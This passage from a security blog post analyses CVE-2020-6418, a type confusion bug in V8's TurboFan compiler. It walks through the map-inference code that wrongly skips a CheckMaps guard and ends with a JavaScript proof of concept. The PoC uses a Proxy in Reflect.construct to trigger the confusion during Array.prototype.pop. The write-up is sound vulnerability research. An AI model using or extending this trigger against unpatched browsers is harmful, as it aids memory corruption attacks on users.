</span></span><span style="display:flex;"><span>  InferReceiverMapsResult result <span style="color:#ff79c6">=</span> kReliableReceiverMaps;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> (<span style="color:#8be9fd;font-style:italic">true</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">switch</span> (effect<span style="color:#ff79c6">-&gt;</span>opcode()) {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> IrOpcode<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kMapGuard</span>: {
</span></span><span style="display:flex;"><span>        Node<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">const</span> object <span style="color:#ff79c6">=</span> GetValueInput(effect, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (IsSame(receiver, object)) {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">*</span>maps_return <span style="color:#ff79c6">=</span> MapGuardMapsOf(effect<span style="color:#ff79c6">-&gt;</span>op());
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> IrOpcode<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kCheckMaps</span>: {
</span></span><span style="display:flex;"><span>        Node<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">const</span> object <span style="color:#ff79c6">=</span> GetValueInput(effect, <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (IsSame(receiver, object)) {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">*</span>maps_return <span style="color:#ff79c6">=</span> CheckMapsParametersOf(effect<span style="color:#ff79c6">-&gt;</span>op()).maps();
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> IrOpcode<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kJSCreate</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (IsSame(receiver, effect)) {
</span></span><span style="display:flex;"><span>          base<span style="color:#ff79c6">::</span>Optional<span style="color:#ff79c6">&lt;</span>MapRef<span style="color:#ff79c6">&gt;</span> initial_map <span style="color:#ff79c6">=</span> GetJSCreateMap(broker, receiver);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (initial_map.has_value()) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">*</span>maps_return <span style="color:#ff79c6">=</span> ZoneHandleSet<span style="color:#ff79c6">&lt;</span>Map<span style="color:#ff79c6">&gt;</span>(initial_map<span style="color:#ff79c6">-&gt;</span>object());
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#6272a4">// We reached the allocation of the {receiver}.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>          <span style="color:#ff79c6">return</span> kNoReceiverMaps;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p><code>NodeProperties::InferReceiverMapsUnsafe</code> checks each operation in the effect chain to see if any operation modifies the type of the object. If the object&rsquo;s type remains unchanged throughout the chain, it returns <code>kReliableReceiverMaps</code>. Otherwise, if the type might change or if there is no receiver maps information available, it returns <code>kUnreliableReceiverMaps</code> or <code>kNoReceiverMaps</code>, respectively.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/map-inference.cc#L18
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>MapInference<span style="color:#ff79c6">::</span>MapInference(JSHeapBroker<span style="color:#ff79c6">*</span> broker, Node<span style="color:#ff79c6">*</span> object, Node<span style="color:#ff79c6">*</span> effect)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">:</span> broker_(broker), object_(object) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//--&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  maps_state_ <span style="color:#ff79c6">=</span> (result <span style="color:#ff79c6">==</span> NodeProperties<span style="color:#ff79c6">::</span>kUnreliableReceiverMaps)
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">?</span> <span style="color:#8be9fd;font-style:italic">kUnreliableDontNeedGuard</span>
</span></span><span style="display:flex;"><span>                    : kReliableOrGuarded;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  DCHECK_EQ(maps_.empty(), result <span style="color:#ff79c6">==</span> NodeProperties<span style="color:#ff79c6">::</span>kNoReceiverMaps);
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//&lt;--
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In this process it returns <code>NodeProperties::kReliableReceiverMaps</code> which is not equal to <code>NodeProperties::kUnreliableReceiverMaps</code>  and sets <code>kReliableOrGuarded</code> to <code>map_state_</code>  as below</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// v8/src/compiler/map-inference.h#L86
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">enum</span> {
</span></span><span style="display:flex;"><span>    kReliableOrGuarded,
</span></span><span style="display:flex;"><span>    kUnreliableDontNeedGuard,
</span></span><span style="display:flex;"><span>    kUnreliableNeedGuard
</span></span><span style="display:flex;"><span>  } maps_state_;
</span></span></code></pre></div><p>Finally, <code>JSCallReducer::ReduceArrayPrototypePop</code> is returned, and <code>MapInference::RelyOnMapsPreferStability</code> is called to determine whether it is necessary to join the <code>CheckMaps</code> node for object type checking based on <code>maps_state_</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> MapInference<span style="color:#ff79c6">::</span>RelyOnMapsPreferStability(
</span></span><span style="display:flex;"><span>    CompilationDependencies<span style="color:#ff79c6">*</span> dependencies, JSGraph<span style="color:#ff79c6">*</span> jsgraph, Node<span style="color:#ff79c6">**</span> effect,
</span></span><span style="display:flex;"><span>    Node<span style="color:#ff79c6">*</span> control, <span style="color:#ff79c6">const</span> FeedbackSource<span style="color:#ff79c6">&amp;</span> feedback) {
</span></span><span style="display:flex;"><span>  CHECK(HaveMaps());
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (Safe()) <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (RelyOnMapsViaStability(dependencies)) <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">true</span>;
</span></span><span style="display:flex;"><span>  CHECK(RelyOnMapsHelper(<span style="color:#ff79c6">nullptr</span>, jsgraph, effect, control, feedback));
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Because the <code>map_state_</code> was determined to be <code>kReliableOrGuarded</code>, there&rsquo;s no need to perform a CheckMaps operation on the simplified graph.</p>
<h1 id="poc">POC</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ITERATIONS <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10000</span>;
</span></span><span style="display:flex;"><span>TRIGGER <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>function <span style="color:#50fa7b">f</span>(a, p) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> a.pop(Reflect.construct(function() {}, arguments, p));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>let a;
</span></span><span style="display:flex;"><span>let p <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Proxy(Object, {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">get</span>: function() {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (TRIGGER) {
</span></span><span style="display:flex;"><span>            a[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">156842099844.51764</span>; <span style="color:#6272a4">// 0x4242424242
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> Object.prototype;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> (let i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> ITERATIONS; i<span style="color:#ff79c6">++</span>) {
</span></span><span style="display:flex;"><span>    let isLastIteration <span style="color:#ff79c6">=</span> i <span style="color:#ff79c6">==</span> ITERATIONS <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>    a <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">4</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (isLastIteration)
</span></span><span style="display:flex;"><span>        TRIGGER <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">true</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ((ret <span style="color:#ff79c6">=</span> f(a, p)) <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">4</span>){
</span></span><span style="display:flex;"><span>	console.log(<span style="color:#f1fa8c">&#34;Triggered: 0x&#34;</span> <span style="color:#ff79c6">+</span> ret.toString(<span style="color:#bd93f9">0x10</span>), ret, a);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="references">References</h1>
<p>[1] <a href="https://chromereleases.googleblog.com/2020/02/stable-channel-update-for-desktop_24.html">https://chromereleases.googleblog.com/2020/02/stable-channel-update-for-desktop_24.html</a></p>
<p>[2] <a href="https://v8.dev/docs/hidden-classes">https://v8.dev/docs/hidden-classes</a></p>
<p>[3] <a href="https://v8.dev/blog/elements-kinds">https://v8.dev/blog/elements-kinds</a></p>
<p>[4] <a href="https://docs.google.com/document/d/1l-oZOW3uU4kSAHccaMuUMl_RCwuQC526s0hcNVeAM1E/edit">https://docs.google.com/document/d/1l-oZOW3uU4kSAHccaMuUMl_RCwuQC526s0hcNVeAM1E/edit</a></p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/cve-2020-6418">CVE-2020-6418</a></li>
					
					<li><a href="/tags/type-confusion">Type Confusion</a></li>
					
					<li><a href="/tags/v8">V8</a></li>
					
					<li><a href="/tags/javascript">Javascript</a></li>
					
					<li><a href="/tags/turbofan">Turbofan</a></li>
					
					<li><a href="/tags/compiler">Compiler</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2025  ¬© Ravshan | Made with Love ‚ù§Ô∏è <a href="https://twitter.com/arzedlab/"> My Twitter ü™Ω</a>
  </div>
	<script src="/js/wasm_exec.js"></script>
  	<script>
    const go = new Go();

    WebAssembly.instantiateStreaming(fetch("\/js\/main.wasm"), go.importObject)
      .then(result => {
        go.run(result.instance);
      })
      .catch(err => console.error("WASM error:", err));

    
    (function callReady() {
      if (typeof collectVisitor === "function") {
        try { collectVisitor(); console.log("collectVisitor called"); }
        catch (e) { console.error("collectVisitor call failed:", e); }
      } else {
        setTimeout(callReady, 30);
      }
    })();
  </script>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
